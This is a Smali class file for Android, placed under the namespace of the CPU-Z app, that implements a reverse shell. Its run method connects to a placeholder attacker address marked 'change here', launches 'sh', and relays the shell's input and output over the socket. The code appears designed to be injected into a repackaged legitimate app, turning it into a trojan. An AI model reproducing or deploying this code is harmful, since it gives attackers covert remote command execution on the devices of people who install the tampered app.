.class public Lcom/cpuid/cpu_z/ShellRunnable;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# direct methods
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

# virtual methods
.method public run()V
    .locals 10

    :try_start_0
    new-instance v0, Ljava/net/Socket;
    
    # change here
    const-string v1, "yourip"
    const/16 v2, yourport
    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v1
    const-string v2, "sh"
    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-virtual {v3}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;
    move-result-object v5
    invoke-virtual {v3}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v6

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v7
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v8

    :loop
    invoke-virtual {v4}, Ljava/io/InputStream;->available()I
    move-result v9
    if-lez v9, :err
    invoke-virtual {v4}, Ljava/io/InputStream;->read()I
    move-result v9
    invoke-virtual {v8, v9}, Ljava/io/OutputStream;->write(I)V

    :err 
    invoke-virtual {v5}, Ljava/io/InputStream;->available()I
    move-result v9
    if-lez v9, :sock
    invoke-virtual {v5}, Ljava/io/InputStream;->read()I
    move-result v9
    invoke-virtual {v8, v9}, Ljava/io/OutputStream;->write(I)V

    :sock
    invoke-virtual {v7}, Ljava/io/InputStream;->available()I
    move-result v9
    if-lez v9, :sleep
    invoke-virtual {v7}, Ljava/io/InputStream;->read()I
    move-result v9
    invoke-virtual {v6, v9}, Ljava/io/OutputStream;->write(I)V

    :sleep
    invoke-virtual {v8}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v6}, Ljava/io/OutputStream;->flush()V
    const-wide/16 v9, 1
    invoke-static {v9, v10}, Ljava/lang/Thread;->sleep(J)V
    goto :loop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method